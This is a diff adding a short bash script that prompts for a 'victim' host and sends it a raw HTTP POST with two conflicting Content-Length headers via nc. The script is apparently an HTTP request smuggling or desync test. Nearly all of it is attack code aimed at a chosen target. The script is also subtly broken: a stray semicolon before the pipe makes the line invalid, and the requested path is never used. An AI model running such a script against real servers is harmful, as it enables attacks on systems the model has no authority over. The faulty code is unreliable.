@@ -1,0 +1,14 @@
+#!/bin/bash
+echo -ne "[+] Enter Victim: "
+read victim
+
+echo -ne "[+] Enter Path: "
+read pagepath
+
+echo "POST / HTTP/1.1\r\n
+Host: $victim\r\n
+Content-Length: 8\r\n
+Content-Length: 7\r\n
+
+12345\r\n
+a"; | nc $victim 80
